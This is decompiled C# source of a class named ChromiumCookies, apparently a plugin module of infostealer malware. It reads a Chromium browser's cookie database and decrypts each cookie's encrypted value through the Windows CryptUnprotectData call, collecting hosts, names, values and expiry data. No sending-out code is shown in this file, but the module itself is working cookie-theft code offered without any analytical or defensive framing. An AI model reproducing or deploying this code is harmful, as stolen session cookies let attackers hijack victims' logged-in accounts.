using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Plugin.Browsers.Chromium
{
	// Token: 0x02000015 RID: 21
	public class ChromiumCookies
	{
		// Token: 0x06000094 RID: 148 RVA: 0x00006C60 File Offset: 0x00004E60
		private static DateTime FromUnixTime(long unixTime)
		{
			DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
			return epoch.AddSeconds((double)unixTime);
		}

		// Token: 0x06000095 RID: 149 RVA: 0x00006C90 File Offset: 0x00004E90
		private static long ToUnixTime(DateTime value)
		{
			return (long)(value - new DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime()).TotalSeconds;
		}

		// Token: 0x06000096 RID: 150 RVA: 0x00006CCC File Offset: 0x00004ECC
		public static List<ChromiumCookies.ChromiumCookie> Cookies(string FileCookie)
		{
			List<ChromiumCookies.ChromiumCookie> data = new List<ChromiumCookies.ChromiumCookie>();
			SQLiteHandler sql = new SQLiteHandler(FileCookie);
			int totalEntries = sql.GetRowCount();
			for (int i = 0; i < totalEntries; i++)
			{
				try
				{
					string h = sql.GetValue(i, "host_key");
					string name = sql.GetValue(i, "name");
					string encval = sql.GetValue(i, "encrypted_value");
					string val = ChromiumCookies.Decrypt(Encoding.Default.GetBytes(encval));
					string valu = sql.GetValue(i, "value");
					string path = sql.GetValue(i, "path");
					bool secure = !(sql.GetValue(i, "is_secure") == "0");
					bool http = !(sql.GetValue(i, "is_httponly") == "0");
					long expiryTime = long.Parse(sql.GetValue(i, "expires_utc"));
					long currentTime = ChromiumCookies.ToUnixTime(DateTime.Now);
					long convertedTime = (expiryTime - 11644473600000000L) / 1000000L;
					DateTime date = new DateTime(1970, 1, 1, 0, 0, 0, 0);
					date = date.AddSeconds((double)convertedTime);
					DateTime exp = ChromiumCookies.FromUnixTime(convertedTime);
					bool expired = currentTime > convertedTime;
					data.Add(new ChromiumCookies.ChromiumCookie
					{
						Host = h,
						ExpiresUTC = exp,
						Expired = expired,
						Name = name,
						EncValue = val,
						Value = valu,
						Path = path,
						Secure = secure,
						HttpOnly = http
					});
				}
				catch (Exception)
				{
					return data;
				}
			}
			return data;
		}

		// Token: 0x06000097 RID: 151 RVA: 0x00006E8C File Offset: 0x0000508C
		private static string Decrypt(byte[] Datas)
		{
			string result;
			try
			{
				ChromiumCookies.DATA_BLOB data_BLOB = default(ChromiumCookies.DATA_BLOB);
				ChromiumCookies.DATA_BLOB data_BLOB2 = default(ChromiumCookies.DATA_BLOB);
				GCHandle gchandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
				ChromiumCookies.DATA_BLOB data_BLOB3;
				data_BLOB3.pbData = gchandle.AddrOfPinnedObject();
				data_BLOB3.cbData = Datas.Length;
				gchandle.Free();
				ChromiumCookies.CRYPTPROTECT_PROMPTSTRUCT cryptprotect_PROMPTSTRUCT = default(ChromiumCookies.CRYPTPROTECT_PROMPTSTRUCT);
				string empty = string.Empty;
				ChromiumCookies.CryptUnprotectData(ref data_BLOB3, null, ref data_BLOB2, (IntPtr)0, ref cryptprotect_PROMPTSTRUCT, (ChromiumCookies.CryptProtectFlags)0, ref data_BLOB);
				byte[] array = new byte[data_BLOB.cbData + 1];
				Marshal.Copy(data_BLOB.pbData, array, 0, data_BLOB.cbData);
				string @string = Encoding.UTF8.GetString(array);
				result = @string.Substring(0, @string.Length - 1);
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x06000098 RID: 152
		[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CryptProtectData(ref ChromiumCookies.DATA_BLOB pDataIn, string szDataDescr, ref ChromiumCookies.DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref ChromiumCookies.CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, ChromiumCookies.CryptProtectFlags dwFlags, ref ChromiumCookies.DATA_BLOB pDataOut);

		// Token: 0x06000099 RID: 153
		[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool CryptUnprotectData(ref ChromiumCookies.DATA_BLOB pDataIn, StringBuilder szDataDescr, ref ChromiumCookies.DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref ChromiumCookies.CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, ChromiumCookies.CryptProtectFlags dwFlags, ref ChromiumCookies.DATA_BLOB pDataOut);

		// Token: 0x02000027 RID: 39
		public class ChromiumCookie
		{
			// Token: 0x1700002F RID: 47
			// (get) Token: 0x060000E6 RID: 230 RVA: 0x00007201 File Offset: 0x00005401
			// (set) Token: 0x060000E7 RID: 231 RVA: 0x00007209 File Offset: 0x00005409
			public string Host { get; set; }

			// Token: 0x17000030 RID: 48
			// (get) Token: 0x060000E8 RID: 232 RVA: 0x00007212 File Offset: 0x00005412
			// (set) Token: 0x060000E9 RID: 233 RVA: 0x0000721A File Offset: 0x0000541A
			public string Name { get; set; }

			// Token: 0x17000031 RID: 49
			// (get) Token: 0x060000EA RID: 234 RVA: 0x00007223 File Offset: 0x00005423
			// (set) Token: 0x060000EB RID: 235 RVA: 0x0000722B File Offset: 0x0000542B
			public string Value { get; set; }

			// Token: 0x17000032 RID: 50
			// (get) Token: 0x060000EC RID: 236 RVA: 0x00007234 File Offset: 0x00005434
			// (set) Token: 0x060000ED RID: 237 RVA: 0x0000723C File Offset: 0x0000543C
			public string EncValue { get; set; }

			// Token: 0x17000033 RID: 51
			// (get) Token: 0x060000EE RID: 238 RVA: 0x00007245 File Offset: 0x00005445
			// (set) Token: 0x060000EF RID: 239 RVA: 0x0000724D File Offset: 0x0000544D
			public string Path { get; set; }

			// Token: 0x17000034 RID: 52
			// (get) Token: 0x060000F0 RID: 240 RVA: 0x00007256 File Offset: 0x00005456
			// (set) Token: 0x060000F1 RID: 241 RVA: 0x0000725E File Offset: 0x0000545E
			public DateTime ExpiresUTC { get; set; }

			// Token: 0x17000035 RID: 53
			// (get) Token: 0x060000F2 RID: 242 RVA: 0x00007267 File Offset: 0x00005467
			// (set) Token: 0x060000F3 RID: 243 RVA: 0x0000726F File Offset: 0x0000546F
			public bool Secure { get; set; }

			// Token: 0x17000036 RID: 54
			// (get) Token: 0x060000F4 RID: 244 RVA: 0x00007278 File Offset: 0x00005478
			// (set) Token: 0x060000F5 RID: 245 RVA: 0x00007280 File Offset: 0x00005480
			public bool HttpOnly { get; set; }

			// Token: 0x17000037 RID: 55
			// (get) Token: 0x060000F6 RID: 246 RVA: 0x00007289 File Offset: 0x00005489
			// (set) Token: 0x060000F7 RID: 247 RVA: 0x00007291 File Offset: 0x00005491
			public bool Expired { get; set; }

			// Token: 0x060000F8 RID: 248 RVA: 0x0000729C File Offset: 0x0000549C
			public override string ToString()
			{
				return string.Format("Host: {1}{0}Name: {2}{0}Value: {8}Path: {4}{0}Expired: {5}{0}HttpOnly: {6}{0}Secure: {7}", new object[]
				{
					Environment.NewLine,
					this.Host,
					this.Name,
					this.Value,
					this.Path,
					this.Expired,
					this.HttpOnly,
					this.Secure,
					this.EncValue
				});
			}
		}

		// Token: 0x02000028 RID: 40
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DATA_BLOB
		{
			// Token: 0x04000079 RID: 121
			public int cbData;

			// Token: 0x0400007A RID: 122
			public IntPtr pbData;
		}

		// Token: 0x02000029 RID: 41
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CRYPTPROTECT_PROMPTSTRUCT
		{
			// Token: 0x0400007B RID: 123
			public int cbSize;

			// Token: 0x0400007C RID: 124
			public ChromiumCookies.CryptProtectPromptFlags dwPromptFlags;

			// Token: 0x0400007D RID: 125
			public IntPtr hwndApp;

			// Token: 0x0400007E RID: 126
			public string szPrompt;
		}

		// Token: 0x0200002A RID: 42
		[Flags]
		private enum CryptProtectPromptFlags
		{
			// Token: 0x04000080 RID: 128
			CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
			// Token: 0x04000081 RID: 129
			CRYPTPROTECT_PROMPT_ON_PROTECT = 2
		}

		// Token: 0x0200002B RID: 43
		[Flags]
		private enum CryptProtectFlags
		{
			// Token: 0x04000083 RID: 131
			CRYPTPROTECT_UI_FORBIDDEN = 1,
			// Token: 0x04000084 RID: 132
			CRYPTPROTECT_LOCAL_MACHINE = 4,
			// Token: 0x04000085 RID: 133
			CRYPTPROTECT_CRED_SYNC = 8,
			// Token: 0x04000086 RID: 134
			CRYPTPROTECT_AUDIT = 16,
			// Token: 0x04000087 RID: 135
			CRYPTPROTECT_NO_RECOVERY = 32,
			// Token: 0x04000088 RID: 136
			CRYPTPROTECT_VERIFY_PROTECTION = 64
		}
	}
}
